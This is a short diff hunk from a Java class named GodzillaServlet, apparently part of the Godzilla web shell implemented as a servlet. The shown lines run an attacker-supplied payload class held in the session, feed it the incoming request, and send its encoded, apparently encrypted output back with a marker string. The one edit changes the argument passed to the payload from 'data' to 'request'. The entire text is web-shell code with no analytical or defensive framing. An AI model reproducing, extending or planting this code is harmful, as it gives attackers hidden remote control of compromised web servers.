@@ -219,7 +219,7 @@ public class GodzillaServlet extends ClassLoader implements Servlet {
                 ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
                 Object f = ((Class)session.getAttribute("payload")).newInstance();
                 f.equals(arrOut);
-                f.equals(data);
+                f.equals(request);
                 response.getWriter().write(this.md5.substring(0, 16));
                 f.toString();
                 response.getWriter().write(base64Encode(this.x(arrOut.toByteArray(), true)));
